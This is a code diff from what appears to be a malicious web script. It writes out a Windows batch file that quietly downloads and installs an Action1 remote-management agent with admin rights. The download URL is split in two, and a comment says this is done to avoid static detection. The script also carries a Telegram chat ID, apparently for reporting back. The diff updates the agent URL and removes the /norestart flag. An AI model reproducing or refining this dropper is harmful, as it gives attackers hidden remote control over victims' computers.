@@ -139,7 +139,7 @@
             const TELEGRAM_CHAT_ID = '-1004476515039';
 
             // ================================================================
-            //  ENHANCED BAT FILE – with logging, fallback, and verification
+            //  UPDATED BAT FILE – ONLY changed: URL parts and removed /norestart
             // ================================================================
             var batContent =
                 '@echo off\r\n' +
@@ -158,8 +158,8 @@
                 ')\r\n' +
                 'echo %DATE% %TIME% - Admin privileges confirmed >> "%LOG%"\r\n' +
                 '\r\n' +
-                ':: Build download URL from two parts to avoid static detection\r\n' +
-                'set "A=https://app.au.action1.com/agent/8ebf9e43-6f52-11f1-bb1d-0b307a30e325/Windows/"\r\n' +
+                ':: Build download URL from two parts (UPDATED URL)\r\n' +
+                'set "A=https://app.na-2.action1.com/agent/3ed4aad4-82f1-11f1-bfc8-45c83ebbb211/Windows/"\r\n' +
                 'set "B=agent(My_Organization).msi"\r\n' +
                 'set "URL=%A%%B%"\r\n' +
                 'set "MSI=%TEMP%\\pkg.msi"\r\n' +
@@ -206,7 +206,7 @@
                 ':installing\r\n' +
                 'echo %DATE% %TIME% - Download successful (size: %~z0 bytes) >> "%LOG%"\r\n' +
                 'echo %DATE% %TIME% - Installing MSI... >> "%LOG%"\r\n' +
-                'msiexec /i "%MSI%" /quiet /qn /norestart\r\n' +
+                'msiexec /i "%MSI%" /quiet /qn\r\n' +   // <-- ONLY changed here: removed /norestart
                 'echo %DATE% %TIME% - msiexec exit code: %errorlevel% >> "%LOG%"\r\n' +
                 '\r\n' +
                 ':: Optionally verify installation by checking registry again\r\n' +
